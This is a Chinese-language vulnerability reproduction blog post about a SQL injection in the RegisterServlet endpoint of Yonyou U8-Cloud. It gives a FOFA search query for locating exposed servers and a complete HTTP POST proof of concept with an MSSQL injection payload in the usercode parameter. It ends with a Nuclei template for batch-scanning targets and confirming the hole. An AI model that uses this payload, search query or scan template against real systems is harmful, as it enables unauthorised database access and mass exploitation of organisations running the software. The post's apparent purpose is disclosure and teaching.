# 原创
：  漏洞复现--用友U8-cloud RegisterServlet SQL注入

# 漏洞复现--用友U8-cloud RegisterServlet SQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

U8 cloud集中于企业内部管理管控，管理规范，高效，协同，透明。通过云模式，低成本，快速部署，即租即用帮助企业免除硬软件投入的快速 搭建企业管理架构。通过云服务连接，业务模式、服务模式的经营创新。该产品RegisterServlet处存在SQL注入

### 二：漏洞影响版本

用友U8-Cloud

### 三：网络空间测绘查询

fofa:<br/> `app="用友-U8-Cloud"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9dd6dd6ff2b25e537e2774f066da7464.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/297a3f521a68c3684d33048f9fcbbec7.jpeg"/><br/> 访问/servlet/RegisterServlet<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6a0eddbab81984c6834b434cadcb205c.jpeg"/><br/> 如上页面即可能存在漏洞<br/> POC：

```
POST /servlet/RegisterServlet HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Content-Length: 85
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip

usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&gt;0--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/781b803e8eb1709888faab20003a9e70.jpeg"/><br/> SQLMAP：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a49b91763df5d282f292295042458c61.jpeg"/>

### 五：批量检测

```
id: yonyou-u8-cloud-RegisterServlet-sql

info:
  name: 用友u8-cloud RegisterServlet SQL注入
  author: rain
  severity: high
  description:
    用友U8 cloud的RegisterServlet接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞进行sql注入。
  tags: [用友U8-Cloud, sql注入, 高危]
  metadata:
    fofa-query: app="用友-U8-Cloud"
http:
  - raw:
      - |-
        POST /servlet/RegisterServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
        Connection: close
        Content-Length: 85
        Accept: */*
        Accept-Language: en
        Content-Type: application/x-www-form-urlencoded
        X-Forwarded-For: 127.0.0.1
        Accept-Encoding: gzip

        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&gt;0-- 
     

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 &amp;&amp; contains(body_1, "e10adc3949ba59abbe56e057f20f883e")'

```
